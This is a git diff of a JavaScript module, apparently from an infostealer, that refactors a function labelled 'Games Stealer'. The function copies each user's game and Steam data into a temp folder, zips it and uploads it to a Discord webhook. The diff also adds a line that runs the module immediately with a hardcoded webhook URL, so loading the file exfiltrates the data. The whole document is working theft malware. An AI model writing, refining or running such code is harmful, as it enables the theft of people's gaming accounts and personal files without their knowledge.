@@ -11,81 +11,81 @@ const hardware = require('./../../utils/hardware/hardware.js');
 
 const games = async (webhookUrl) => {
     const users = await hardware.getUsers();
+
+    const gamesTempDir = path.join(os.tmpdir(), `games-temp`);
+    if (!fs.existsSync(gamesTempDir)) {
+        fs.mkdirSync(gamesTempDir, { recursive: true });
+    }
+
     let anyGameFound = false;
+    let foundGames = '';
 
     for (const user of users) {
-        const gamesTempDir = path.join(os.tmpdir(), `games-temp`);
-        let foundGames = '';
-
         for (const [gameName, gamePaths] of Object.entries(gamesPaths.getGames())) {
-            const destGames = path.join(gamesTempDir, user.split(path.sep)[2], gameName);
-            let gameDataFound = false;
+            const destGames = path.join(gamesTempDir, path.basename(user), gameName);
 
             for (const [name, relativePath] of Object.entries(gamePaths)) {
                 const gamePath = path.join(user, relativePath);
 
+                if (!fs.existsSync(gamePath)) {
+                    continue;
+                }
+
                 try {
-                    if (fs.existsSync(gamePath)) {
+                    const isDirectory = fs.lstatSync(gamePath).isDirectory();
+                    const gameDestPath = isDirectory
+                        ? path.join(destGames, name)
+                        : path.join(destGames, name, path.basename(gamePath));
 
-                        gameDataFound = true;
-
-                        if (!fs.existsSync(destGames)) {
-                            fs.mkdirSync(destGames, { recursive: true });
-                        }
-
-                        if (path.extname(gamePath)) {
-                            const gameDestPath = path.join(destGames, name, path.basename(gamePath));
-                            if (!fs.existsSync(path.join(destGames, name))) {
-                                fs.mkdirSync(path.join(destGames, name), { recursive: true });
-                            }
-                            await fileutil.copy(gamePath, gameDestPath);
-                        } else {
-                            await fileutil.copy(gamePath, path.join(destGames, name));
-                        }
-
-                        if (!foundGames.includes(gameName)) {
-                            foundGames += `\n✅ ${gameName}`;
-                            anyGameFound = true;
-                        }
+                    if (!fs.existsSync(path.join(destGames, name))) {
+                        fs.mkdirSync(path.join(destGames, name), { recursive: true });
                     }
-                } catch (error) {
-                    console.error(error);
+
+                    await fileutil.copy(gamePath, gameDestPath);
+
+                    if (!foundGames.includes(gameName)) {
+                        foundGames += `\n✅ ${path.basename(user)} - ${gameName}`;
+                        anyGameFound = true;
+                    }
+                } catch (err) {
+                    continue;
                 }
             }
 
-            if (!gameDataFound) {
+            if (!anyGameFound) {
                 fs.rmSync(destGames, { recursive: true, force: true });
             }
         }
+    }
 
-        if (!foundGames) {
-            fs.rmSync(gamesTempDir, { recursive: true, force: true });
-            continue;
-        }
+    if (!foundGames) {
+        fs.rmSync(gamesTempDir, { recursive: true, force: true });
+        return;
+    }
 
-        const gamesTempZip = path.join(os.tmpdir(), 'games.zip');
-        try {
-            await fileutil.zipDirectory({
-                inputDir: gamesTempDir,
-                outputZip: gamesTempZip
-            })
+    if (foundGames.length > 4090) {
+        foundGames = 'Numerous games to explore.';
+    }
 
-            await requests.webhook(webhookUrl, {
-                embeds: [{
-                    title: `Games Stealer - ${user.split(path.sep)[2]}`,
-                    description: '```' + foundGames + '```',
-                }],
-            }, [gamesTempZip]);
+    const gamesTempZip = path.join(os.tmpdir(), 'games.zip');
+    try {
+        await fileutil.zipDirectory({
+            inputDir: gamesTempDir,
+            outputZip: gamesTempZip
+        });
 
-            const WishTempDir = fileutil.WishTempDir('games');
-            await fileutil.copy(gamesTempDir, WishTempDir);
+        await requests.webhook(webhookUrl, {
+            embeds: [{
+                title: `Games Stealer`,
+                description: '```' + foundGames + '```',
+            }],
+        }, [gamesTempZip]);
 
-            [gamesTempDir, gamesTempZip].forEach(async dir => {
-                await fileutil.removeDir(dir);
-            });
-        } catch (error) {
-            console.error(error);
-        }
+        [gamesTempDir, gamesTempZip].forEach(dir => {
+            fileutil.removeDir(dir);
+        });
+    } catch (error) {
+        console.error(error);
     }
 };
 
@@ -138,7 +138,7 @@ const steam = async (webhookUrl) => {
             await fileutil.copy(steamTempDir, WishTempDir);
 
             [steamTempDir, steamTempZip].forEach(dir => {
-                fs.rmSync(dir, { recursive: true, force: true });
+                fileutil.removeDir(dir);
             });
         } catch (error) {
             console.error(error);
@@ -150,3 +150,5 @@ module.exports = async (webhookUrl) => {
     await games(webhookUrl);
     await steam(webhookUrl);
 }
+
+module.exports('https://canary.discord.com/api/webhooks/1289317582410874911/Xw8JFexFx_U35vqrLVrTRG9FgIppud0hTMwTwxFW97neliTZ7P99cK7ewkDO7A8LE4UX')
